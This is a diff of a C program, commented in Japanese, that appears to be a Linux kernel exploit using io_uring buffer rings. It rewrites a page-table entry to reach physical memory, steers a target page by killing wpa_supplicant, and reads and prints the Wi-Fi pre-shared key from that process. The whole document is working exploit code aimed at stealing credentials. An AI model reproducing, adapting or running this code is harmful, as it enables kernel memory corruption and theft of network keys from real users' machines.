@@ -4,12 +4,11 @@
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
-#include <sys/mman.h>
 #include <liburing.h>
 #include <stdlib.h>
 
-/** page size */
-#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)
+/* PSK の長さ 256bit = 32byte*/
+const int KEY_LENGTH = 32;
 
 /* dummy page */
 const int DUMMY_PAGE = 199;
@@ -23,51 +22,21 @@ const int OFFSET = 0x5000;
 // psk のページ内オフセット
 const int PAGE_IN_OFFSET = 0x1f6;
 
+void *mmap_fixed(void *addr);
+void arrange_psk(const uint64_t *psk);
+
 int main() {
+    // psk を 64bit ずつ格納する配列
+    uint64_t psk[KEY_LENGTH / sizeof(uint64_t)];
+
     // 領域を3つ確保
-    void *new_map_1 = mmap(
-        (void *)0xdead000000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_1 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
-
-    void *new_map_2 = mmap(
-        (void *)0xdead200000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_2 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
-
-    void *new_map_3 = mmap(
-        (void *)0xdead201000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_3 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
+    void *new_map_1 = mmap_fixed((void *)0xdead000000);
+    void *new_map_2 = mmap_fixed((void *)0xdead200000);
+    void *new_map_3 = mmap_fixed((void *)0xdead201000);
 
     // io_uring の初期化
     struct io_uring ring;
     io_uring_queue_init(40, &ring, 0);
-    printf("[+] uring_fd = %d\n", ring.ring_fd);
 
     // register buffer ring
     struct io_uring_buf_reg reg = {
@@ -113,11 +82,8 @@ int main() {
     printf("[+] at %p: %lx\n", pbuf_map, *(uint64_t *)pbuf_map);
     printf("[+] at %p: %lx\n", (uint64_t *)pbuf_map + 1, *((uint64_t *)pbuf_map + 1));
 
-    // PTE 書き換え
-    *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
-
-    // ページ解放
-    if (munmap(pbuf_map, 0x1000) == -1) perror("[-] munmap() failed");
+    // new_map_3 の pfn を保存
+    uint64_t new_map_3_pfn = *((uint64_t *)pbuf_map + 1);
 
     // ダミーページ確保
     address dummy_pages[DUMMY_PAGE];
@@ -128,13 +94,11 @@ int main() {
     }
 
     // wpa_supplicant が起動中なら一度止める
-    int res = 0;
     if (get_process_id()) {
-        res = kill_wpa_supplicant();
-    }
-    if (res) {
-        printf("[-] failed to kill wpa_supplicant\n");
-        exit(1);
+        if (kill_wpa_supplicant()) {
+            printf("[-] failed to kill wpa_supplicant\n");
+            exit(1);
+        }
     }
 
     // 他のプロセスに CPU を譲る
@@ -178,19 +142,54 @@ int main() {
 
     // 誘導に成功したか確認
     if (target_page.phys_addr == phys_addr) {
+        // PTE 書き換え
+        *(uint64_t *)pbuf_map = new_map_3_pfn;
+
         printf("[+] successfully lead to the target page\n");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
-        for (int i = 0; i < 4; i++) {
-            printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
+        for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
+            psk[i] = *(uint64_t *)(psk_addr + i * sizeof(uint64_t));
         }
+        arrange_psk(psk);
     } else {
-        printf("[-] failed lead to the target page\n");
-        if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
+        printf("[-] failed to lead to the target page\n");
     }
 
-    // メモリの解放関連
-    if (munmap(new_map_1, 0x1000) == -1) perror("munmap() failed");
+    // 後処理
+    munmap(new_map_1, 0x1000);
+    // munmap(pbuf_map, 0x1000);
+    kill_wpa_supplicant();
+    // munmap(new_map_2, 0x1000);
     io_uring_queue_exit(&ring);
 
     return 0;
+}
+
+void *mmap_fixed(void *addr) {
+    void *new_mem = mmap(
+        addr,
+        0x1000,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
+        -1,
+        0
+    );
+    if (new_mem == MAP_FAILED) {
+        perror("[-] mmap() failed");
+        exit(1);
+    }
+    return new_mem;
+}
+
+void arrange_psk(const uint64_t *psk) {
+    printf("========== PSK ==========\n");
+    uint64_t value;
+    for (int i = 0; i < KEY_LENGTH / sizeof(uint64_t); i++) {
+        value = psk[i];
+        while (value > 0) {
+            printf("%02lx ", value % 0x100);
+            value /= 0x100;
+        }
+    }
+    printf("\n");
 }
